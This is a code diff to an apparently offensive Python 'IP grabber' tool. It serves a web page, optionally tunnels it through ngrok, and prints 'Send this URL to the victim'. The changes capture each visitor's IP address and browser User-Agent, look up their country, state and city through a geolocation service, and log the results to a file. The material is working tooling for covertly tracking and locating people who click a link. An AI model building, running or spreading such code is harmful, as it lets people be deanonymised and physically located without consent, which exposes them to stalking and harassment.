@@ -17,12 +17,13 @@ from datetime import datetime
 import time
 import subprocess
 from io import BytesIO
+import requests
 import urllib.request
 from urllib.parse import unquote
 import json
 import wget
 import re
-import os
+import os, sys
 
 class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
     
@@ -34,25 +35,38 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
           if not port:
             port = 1337
           httpd = HTTPServer(('0.0.0.0', int(port)), SimpleHTTPRequestHandler)
-          if choice.upper() == 'Y':
-            print(BLUE+BOLD+"Initializing ngrok reverse proxy"+ENDC)
-            os.system(f'./ngrok http {port} > /dev/null &')
-            os.system('curl --silent http://localhost:4040/api/tunnels > tunnels.json')
-            time.sleep(6)
-            tunnel = open('tunnels.json','r')
-            data = json.load(tunnel)
-            address = data['tunnels'][0]
-            print(BOLD+RED+f"\n[+] Send this URL to the victim: {address['public_url']}"+ENDC)
-          else:
-            print(BOLD+RED+f"\n[+] Send this URL to the victim: http://0.0.0.0:{port}/"+ENDC)
-          while True:
-              print(BLUE+'\n.:: Listening on local port %s...\n'%(port)+ENDC)
-              httpd.serve_forever()
         
         except OSError:
             print(RED+"Adress already in use!\n"+ENDC)
             quit()
 
+        try:
+          loading = "\nInitializing ngrok reverse proxy...\n"
+          if choice.upper() == 'Y':
+            os.system(f'./ngrok http {port} > /dev/null &')
+            for l in loading:
+              time.sleep(0.1)
+              sys.stdout.write(l)
+              sys.stdout.flush()
+
+            time.sleep(6)
+            proc = subprocess.Popen('curl --silent http://localhost:4040/api/tunnels > tunnels.json && echo OK',shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE,stdin=subprocess.PIPE)
+            out = proc.stdout.read()
+            if 'OK' in out.decode('utf-8'):
+              tunnel = open('tunnels.json','r')
+              data = json.load(tunnel)
+              address = data['tunnels'][0]
+              print(BOLD+RED+f"\n[+] Send this URL to the victim: {address['public_url']}"+ENDC)
+            else:
+              print(RED+'[!] Error to get ngrok link, try run the script again'+ENDC)
+          else:
+            print(BOLD+RED+f"\n[+] Send this URL to the victim: http://0.0.0.0:{port}/"+ENDC)
+          
+          while True:
+              print(BLUE+'\n.:: Listening on local port %s...\n'%(port)+ENDC)
+              httpd.serve_forever()
+        except:
+          print(RED+'Error with ngrok, try again'+ENDC)
     def do_GET(self):
       self.get_ip()
       self.send_response(200)
@@ -80,17 +94,23 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         for line in log.split('\n'):
           if 'User-Agent' in line:
             data.append(line.split('User-Agent: ')[1])
+          
           if 'X-Forwarded-For' in line:
-            data.append(line.split('X-Forwarded-For: ')[1])
+            global ip
+            ip = line.split('X-Forwarded-For: ')[1]
+            data.append(ip)
+
 
         if self.path != '/favicon.ico':
           if len(data) == 2:
             if not data[0] in self.ips:
               date = self.get_time()
-              self.ips.append(data[0])
-              print(BOLD+RED+'[+] IP Found: ',data[1]+'\n[+] User-Agent: ',data[0],ENDC)
+              self.ips.append(ip)
+              response = requests.get("https://geolocation-db.com/json/{}&position=true".format(ip)).json()
+              geolocation = [response['country_name'],response['state'],response['city']]
+              print(BOLD+RED+'[+] IP Found: '+ip+'\n[+] User-Agent: '+data[0]+'\n[+] Country: '+geolocation[0]+'\n[+] State: '+geolocation[1]+'\n[+] City: '+geolocation[2]+'\n'+ENDC)
               file = open('ips.txt','a+')
-              file.write('Date: '+str(date)+' IP: '+str(data[1])+' User-Agent: '+data[0]+'\n')
+              file.write('Date: '+str(date)+' IP: '+str(ip)+' User-Agent: '+data[0]+'\n')
           else:
             print(BOLD+BLUE+'[-] IP NOT FOUND!'+'\n[+] User-Agent:',data[0],ENDC)
 
